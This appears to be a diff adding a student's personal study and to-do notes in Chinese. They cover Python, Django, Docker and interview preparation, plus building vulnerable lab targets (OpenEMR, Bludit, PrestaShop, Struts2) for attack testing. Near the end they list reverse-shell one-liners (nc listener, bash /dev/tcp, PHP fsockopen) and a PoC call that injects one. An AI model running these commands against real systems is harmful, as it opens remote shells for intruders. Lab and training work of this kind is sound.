@@ -1,0 +1,141 @@
+已完成约240集（协程、redis和GUI开发暂且搁置）
+上周：43节
+
+周一：2
+周二：3
+周三：2
+周四：7
+周五：4
+周六：5
+周日：8+
+
+本周已完成：23+
+
+
+对照 Python-100-Days 补漏查缺
+走一整套流程 前后端 全栈（安全）
+Linux+shell+Docker+Python+Vue.js+Django+Redis+MySQL+Scrapy+函数编程
+
+pycharm 创建django项目什么都不用创建 测试
+
+
+学完之后 redis 要学 前端也要学
+
+base 64 加密解密 破解 session 为 none 解决
+
+多学一点 进步一点 超越他人一点 量变产生质变
+
+细节问题后续补充 按照攻击路线
+
+黄feifei会议纪要查看
+
+OpenEMR漏洞软件版本具体信息指纹需更改 
+
+下个月整 zeek 文档等东西，争取基本符合要求
+
+flag.txt 文件挂载进容器
+
+set -eo pipefail
+
+python -f argv 怎么设置 -f
+
+docker 加到用户组
+sudo usermod -aG docker liuheng ${USER}
+
+尽可能进度快点，赶早不赶晚
+
+管道命令的使用总结
+
+有时间配置免密登陆配置 ssh terminal登录自己的虚拟机或者内网服务器
+
+每天文档总结1小时
+
+多练 什么都要尝试一下 边学习便总结 多看面经 经常性总结（文档） 养成习惯 找实习才易如反掌
+
+bludit遗留问题 通过挂载配置文件.htaccess解决
+sed -i 's/RewriteCond %{REQUEST_FILENAME} !-d/#RewriteCond %{REQUEST_FILENAME} !-d/g' .htaccess
+RewriteRule ^bl-content/(databases|workspaces|pages|)/.*$ - [R=404,L]
+poc脚本内容部分待修改 poc脚本执行用户为管理员还是test 用户？确定
+
+
+bludit安装问题解决 openemr 解决 内网系统搭建完成 biubiu搭建完成
+
+openemr漏洞利用技巧总结 openemr 数据库中插入一条数据bludit qwer123
+mysql 执行一条命令插入一条数据 （待做）
+执行一个脚本 在mysql中插入一条数据 数据库容器启动执行的脚本 docker-entrypoint.sh 待修改添加代码 
+
+- 对设计场景中相关的 DVE 按需修改和部署，并按照预想攻击路径进行测试
+- 继续自查 DVE
+
+scrapy xpath语法 学习测试
+scrapy 练习基础 一些setting设置含义 手机截图查看
+
+
+数据库优化相关 mysql一些函数
+mysqld 与mariadb区别
+红黑树、b+
+算法复杂度、时间复杂度
+
+django需要一周 压缩为5天 其他两天 一周结束正式开始面试（元旦前后开始）
+
+
+听是一部分 关键是练习 体现在刷题、做项目上
+
+django结束 
+
+挂载文件到服务器根目录失败的原因
+
+
+查看面经 字节实习 小米 快手等 磨刀不误砍柴功
+
+
+学完python学java java学习笔记整理
+
+整理文档 注意格式问题
+
+每学习完一部分及时更新文档
+微博收藏专业相关的GitHub仓库 收藏到网页
+
+路由表 路由
+网络拓扑 看之前的计网实验
+
+使用draw.io绘制简洁大方的流程图
+
+nc -lvp 2333
+
+bash -i >& /dev/tcp/192.168.56.114/2333 0>&1
+
+php poc.php http://192.168.56.114:8183/admin-dev/ prestashop@qq.com prestashop system 'bash -i >& /dev/tcp/192.168.56.112/2333 0>&1'
+
+php -r '$sock=fsockopen("192.168.56.114",2333);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+弱口令 
+
+盐值 哈希值  解密 
+md sha256 sha128
+
+ovs 虚拟网络IP地址分配 网络拓扑
+理解清
+
+web shell
+
+git commit link issue commit 其他：周报、 链接
+cookie 的利用方式
+awk
+shell命令系统学
+全栈:
+    编程+框架+数据库（深入）+项目+算法+工具+计算机四大本相关理论知识+安全相关
+
+前10的互联网
+字节 阿里 腾讯 百度 美团 滴滴 京东 拼多多 快手 国企
+
+
+学习这种写法
+
+services: 
+  web:
+    build:
+      context: ./web
+      dockerfile: Dockerfile
+    image: shawnsky/live-struts2-045:0.1
+    container_name: biubiu-s2-045-web-app
